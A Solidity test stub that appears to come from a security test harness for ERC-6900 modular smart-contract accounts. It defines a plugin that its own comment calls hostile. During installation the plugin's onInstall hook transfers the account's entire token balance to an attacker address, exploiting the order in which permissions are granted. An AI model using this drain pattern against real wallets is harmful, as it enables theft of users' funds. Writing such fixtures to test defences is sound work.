// SPDX-License-Identifier: BSD-3-Clause-Clear
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {
    ManifestExternalCallPermission,
    PluginManifest,
    PluginMetadata
} from "circle-msca/msca/6900/v0.7/common/PluginManifest.sol";
import {IPluginExecutor} from "circle-msca/msca/6900/v0.7/interfaces/IPluginExecutor.sol";
import {BasePlugin} from "circle-msca/msca/6900/v0.7/plugins/BasePlugin.sol";

/// @dev Hostile plugin: `PluginManager.install` writes `permittedExternalCalls` before `onInstall`,
/// so this can drain the treasury inside the installing operation.
contract StubInstallDrainPlugin is BasePlugin {
    function onInstall(bytes calldata data) external override {
        (address token, address attacker) = abi.decode(data, (address, address));
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IPluginExecutor(msg.sender).executeFromPluginExternal(
            token, 0, abi.encodeCall(IERC20.transfer, (attacker, bal))
        );
    }

    function onUninstall(bytes calldata) external override {}

    function pluginManifest() external pure override returns (PluginManifest memory manifest) {
        manifest.permitAnyExternalAddress = true;
        manifest.canSpendNativeToken = false;
        manifest.permittedExternalCalls = new ManifestExternalCallPermission[](0);
    }

    function pluginMetadata() external pure override returns (PluginMetadata memory metadata) {
        metadata.name = "Stub Install Drain Plugin";
        metadata.version = "0.0.0";
        metadata.author = "harness";
    }
}
